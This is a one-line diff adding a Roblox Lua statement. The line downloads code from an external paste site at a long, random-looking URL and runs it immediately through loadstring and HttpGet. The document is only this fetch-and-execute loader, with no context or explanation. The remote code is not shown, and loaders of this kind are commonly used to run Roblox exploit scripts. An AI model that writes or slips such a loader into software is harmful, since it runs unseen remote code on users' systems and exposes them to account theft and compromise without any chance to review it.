@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://shz.al/~oksdhfio2hfpuh2e8ugf8yhepdgd289ehf8uoywhu93hr0g983w4hr8g79ju429ugyojui3kiriygh20983riyghuio4gry8fh280ygry8yh9uher8h2-94hrgh92ehr8fh29u4hg8yeh9ufh42urhg9uh28ygr'),true))()
